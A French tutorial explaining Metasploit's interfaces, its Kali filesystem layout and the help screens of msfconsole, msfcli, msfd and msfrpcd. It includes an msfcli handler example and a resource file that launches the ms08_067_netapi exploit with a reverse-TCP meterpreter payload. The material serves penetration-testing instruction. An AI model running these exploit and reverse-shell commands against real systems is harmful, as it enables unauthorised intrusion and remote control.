## Les Interfaces de Metasploit

### 1. Le Système de Fichiers

Avant de commencer à explorer les diverses interfaces de Metasploit, il est important de comprendre les différents éléments présents dans le système de fichiers. Cela permet de comprendre le fonctionnement des différents affichages et de faire certains changements si nécessaire.

Sur un système Kali, les données relatives à Metasploit se trouvent à l'emplacement `/usr/share/metasploit-framework`.

```sh
root@kali:~# ls -l /usr/share/metasploit-framework
total 148  
drwxr-xr-x  4 root root  4096 mars  28 18:31 app  
drwxr-xr-x  3 root root  4096 mars  28 18:54 config  
drwxr-xr-x 21 root root  4096 mars  28 18:31 data  
drwxr-xr-x  3 root root  4096 mars  28 18:31 db  
lrwxrwxrwx  1 root root    27 mars  28 18:32 documentation -> ../doc/metasploit-framework  
-rwxr-xr-x  1 root root  1209 janv. 24 18:24 Gemfile  
-rw-r--r--  1 root root  9359 janv. 25 09:40 Gemfile.lock  
drwxr-xr-x 14 root root  4096 mars  28 18:31 lib  
-rw-r--r--  1 root root  8652 janv. 25 09:40 metasploit-framework.gemspec  
drwxr-xr-x  9 root root  4096 mars  28 18:31 modules  
-rwxr-xr-x  1 root root  1263 janv. 25 09:40 msfconsole  
-rwxr-xr-x  1 root root  2813 janv. 25 09:40 msfd  
-rwxr-xr-x  1 root root  5326 janv. 25 09:40 msfdb  
-rw-r--r--  1 root root   635 janv. 25 09:40 msf-json-rpc.ru  
-rwxr-xr-x  1 root root  2229 janv. 25 09:40 msfrpc  
-rwxr-xr-x  1 root root  9677 janv. 25 09:40 msfrpcd  
-rwxr-xr-x  1 root root   166 janv. 25 09:40 msfupdate  
-rwxr-xr-x  1 root root 12921 janv. 25 09:40 msfvenom  
-rw-r--r--  1 root root   551 janv. 25 09:40 msf-ws.ru  
drwxr-xr-x  2 root root  4096 mars  28 18:31 plugins  
-rwxr-xr-x  1 root root  1299 janv. 24 18:24 Rakefile  
-rwxr-xr-x  1 root root   604 janv. 25 09:40 ruby  
-rwxr-xr-x  1 root root   140 janv. 25 09:40 script-exploit  
-rwxr-xr-x  1 root root   141 janv. 25 09:40 script-password  
-rwxr-xr-x  1 root root   138 janv. 25 09:40 script-recon  
drwxr-xr-x  6 root root  4096 mars  28 18:31 scripts  
drwxr-xr-x 11 root root  4096 mars  28 18:31 tools  
drwxr-xr-x  3 root root  4096 mars  28 18:31 vendor
```

#### Dossier Modules

Le dossier `modules/` contient principalement les exploits, payloads, auxiliaires ainsi que les modules post-exploitation.

```sh
root@kali:/usr/share/metasploit-framework/modules# ls -l  
total 28  
drwxr-xr-x 21 root root 4096 mars  28 18:31 auxiliary  
drwxr-xr-x 12 root root 4096 mars  28 18:31 encoders  
drwxr-xr-x  3 root root 4096 mars  28 18:31 evasion  
drwxr-xr-x 21 root root 4096 mars  28 18:31 exploits  
drwxr-xr-x 11 root root 4096 mars  28 18:31 nops  
drwxr-xr-x  5 root root 4096 mars  28 18:31 payloads  
drwxr-xr-x 14 root root 4096 mars  28 18:31 post
```

##### Exploits

Les exploits sont triés par système d'exploitation.

```sh
root@kali:/usr/share/metasploit-framework/modules/exploits# ls -l 
total 80  
drwxr-xr-x  3 root root 4096 mars  28 18:31 aix  
drwxr-xr-x  6 root root 4096 mars  28 18:31 android  
drwxr-xr-x  5 root root 4096 mars  28 18:31 apple_ios  
drwxr-xr-x  3 root root 4096 mars  28 18:31 bsd  
drwxr-xr-x  3 root root 4096 mars  28 18:31 bsdi  
drwxr-xr-x  3 root root 4096 mars  28 18:31 dialup  
-rw-r--r--  1 root root 2698 janv. 24 18:24 example.rb  
drwxr-xr-x  3 root root 4096 mars  28 18:31 firefox  
drwxr-xr-x  9 root root 4096 mars  28 18:31 freebsd  
drwxr-xr-x  3 root root 4096 mars  28 18:31 hpux  
drwxr-xr-x  3 root root 4096 mars  28 18:31 irix  
drwxr-xr-x 21 root root 4096 mars  28 18:31 linux  
drwxr-xr-x  3 root root 4096 mars  28 18:31 mainframe  
drwxr-xr-x 26 root root 4096 mars  28 18:31 multi  
drwxr-xr-x  4 root root 4096 mars  28 18:31 netware  
drwxr-xr-x 13 root root 4096 mars  28 18:31 osx  
drwxr-xr-x  4 root root 4096 mars  28 18:31 qnx  
drwxr-xr-x  8 root root 4096 mars  28 18:31 solaris  
drwxr-xr-x 14 root root 4096 mars  28 18:31 unix  
drwxr-xr-x 49 root root 4096 mars  28 18:31 windows
```

##### Payloads

Le répertoire `payloads/` contient des charges malveillantes, classées en différents types.

```sh
root@kali:/usr/share/metasploit-framework/modules/payloads# ls -l 
total 12  
drwxr-xr-x 22 root root 4096 mars  28 18:31 singles  
drwxr-xr-x 13 root root 4096 mars  28 18:31 stagers  
drwxr-xr-x 13 root root 4096 mars  28 18:31 stages
```

- **Singles** : Payloads envoyés en une seule fois à la machine cible.
- **Stagers** : Payloads envoyés en plusieurs étapes.

##### Auxiliaires

Les modules auxiliaires permettent de réaliser diverses actions, telles que le scan de ports ou la vérification de configurations.

```sh
root@kali:/usr/share/metasploit-framework/modules/auxiliary# ls -l  
total 96  
drwxr-xr-x 45 root root  4096 avril 14 15:42 admin  
drwxr-xr-x  2 root root  4096 avril 14 15:42 analyze  
drwxr-xr-x  2 root root  4096 avril 14 15:42 bnat  
drwxr-xr-x  7 root root  4096 avril 13 17:03 client  
drwxr-xr-x  2 root root  4096 avril 14 15:42 crawler  
drwxr-xr-x  2 root root  4096 avril 14 15:42 docx  
drwxr-xr-x 27 root root  4096 avril 13 17:03 dos  
-rw-r--r--  1 root root  1217 avril 11 00:30 example.rb  
drwxr-xr-x  2 root root  4096 avril 

14 15:42 fileformat  
drwxr-xr-x 10 root root  4096 avril 13 17:03 fuzzers  
drwxr-xr-x  2 root root 20480 avril 14 15:42 gather  
drwxr-xr-x  2 root root  4096 avril 14 15:42 parser  
drwxr-xr-x  3 root root  4096 avril 13 17:03 pdf  
drwxr-xr-x 85 root root  4096 avril 14 15:42 scanner  
drwxr-xr-x  4 root root  4096 avril 14 15:42 server  
drwxr-xr-x  2 root root  4096 avril 14 15:42 sniffer  
drwxr-xr-x  9 root root  4096 avril 13 17:03 spoof  
drwxr-xr-x  3 root root  4096 avril 13 17:03 sqli  
drwxr-xr-x  2 root root  4096 avril 14 15:42 voip  
drwxr-xr-x  5 root root  4096 avril 13 17:03 vsploit
```

### 2. MSFconsole

MSFconsole est l'interface la plus connue et la plus utilisée de Metasploit. Elle est interactive, simple d'utilisation et dispose d'un système d'autocomplétion.

```sh
root@kali:~/Desktop# msfconsole

MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
MMMMMMMMMMM                MMMMMMMMMM  
MMMN$                           vMMMM  
MMMNl  MMMMM             MMMMM  JMMMM  
MMMNl  MMMMMMMN       NMMMMMMM  JMMMM  
MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM  
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM  
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM  
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM  
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM  
MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM  
MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM  
MMMMR  ?MMNM             MMMMM .dMMMM  
MMMMNm `?MMM             MMMM` dMMMMM  
MMMMMMN  ?MM             MM?  NMMMMMN  
MMMMMMMMNe                 JMMMMMNMMM  
MMMMMMMMMMNm,            eMMMMMNMMNMM  
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM  
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM  
        https://metasploit.com  
 
       =[ metasploit v5.0.2-dev                           ]  
+ -- --=[ 1852 exploits - 1046 auxiliary - 325 post       ]  
+ -- --=[ 541 payloads - 44 encoders - 10 nops            ]  
+ -- --=[ 2 evasion                                       ]  
+ -- --=[ ** This is Metasploit 6 development branch **   ]  
 
msf6 >
```

### 3. MSFcli (Obsolète)

MSFcli était une interface en ligne de commande permettant de faciliter le scripting de Metasploit. Elle a été remplacée par l'option `-x` de MSFconsole.

```sh
root@kali:~/Desktop# msfcli -h
Usage: /usr/bin/msfcli   [mode]  
===========================================================  
 
   Mode           Description 
   ----           ----------- 
  (A)dvanced      Show available advanced options for this module  
  (AC)tions       Show available actions for this auxiliary module  
  (C)heck         Run the check routine of the selected module  
  (E)xecute       Execute the selected module  
  (H)elp          You're looking at it baby!  
  (I)DS Evasion   Show available ids evasion options for this module 
  (O)ptions       Show available options for this module  
  (P)ayloads      Show available payloads for this module  
  (S)ummary       Show information about this module  
  (T)argets       Show available targets for this exploit module
 
Examples:  
msfcli multi/handler payload=windows/meterpreter/reverse_tcp lhost=IP E
msfcli auxiliary/scanner/http/http_version rhosts=IP encoder= post= nop= E
```

### 4. Msfd

Msfd (Msf Daemon) est un service permettant d'obtenir une interface MSFconsole à distance, via un socket TCP.

```sh
root@kali:~# msfd -h  
 
Usage: msfd <options>  
 
OPTIONS: 
   -A <opt>  Specify list of hosts allowed to connect  
   -D <opt>  Specify list of hosts not allowed to connect  
   -a <opt>  Bind to this IP address instead of loopback  
   -f        Run the daemon in the foreground  
   -h        Help banner  
   -p <opt>  Bind to this port instead of 55554  
   -q        Do not print the banner on startup  
   -s        Use SSL
```

### 5. MSFrpcd

MSFrpcd permet de gérer Metasploit à distance. Il nécessite une authentification.

```sh
root@kali:/usr/share/metasploit-framework# ruby msfrpcd -h  
 
Usage: msfrpcd <options>  
 
OPTIONS:  
 
   -P <opt>  Specify the password to access msfrpcd  
   -S        Disable SSL on the RPC socket  
   -U <opt>  Specify the username to access msfrpcd  
   -a <opt>  Bind to this IP address (default: 0.0.0.0)  
   -c       (JSON-RPC) Path to certificate (default: /root/.msf4/msf-ws-cert.pem)  
   -f        Run the daemon in the foreground  
   -h        Help banner  
   -j        (JSON-RPC) Start JSON-RPC server  
   -k        (JSON-RPC) Path to private key (default: /root/.msf4/msf-ws-key.pem)  
   -n        Disable database  
   -p <opt>  Bind to this port (default: 55553)  
   -t <opt>  Token Timeout seconds (default: 300)  
   -u <opt>  URI for Web server  
   -v        (JSON-RPC) SSL enable verify (optional) client cert requests
```

### 6. Les Fichiers Ressources

Les fichiers ressources permettent d'automatiser l'exécution de commandes séquentielles dans Metasploit.

#### Exemple d'Utilisation

```sh
root@kali:~/Desktop# cat resource.rc  
use exploit/windows/smb/ms08_067_netapi  
set RHOST (IP)  
set PAYLOAD windows/meterpreter/reverse_tcp  
set LHOST (IP)
```

Pour exécuter les commandes du fichier ressource :

```sh
msf6 > resource resource.rc
ou
root@kali:~/Desktop# msfconsole -r resource.rc
```

### Conclusion

La connaissance des différentes interfaces et de l'organisation du système de fichiers de Metasploit est essentielle pour une utilisation efficace du framework. Ces outils vous permettent de naviguer, d'exécuter des exploits, de gérer des sessions et d'automatiser des tâches avec facilité.
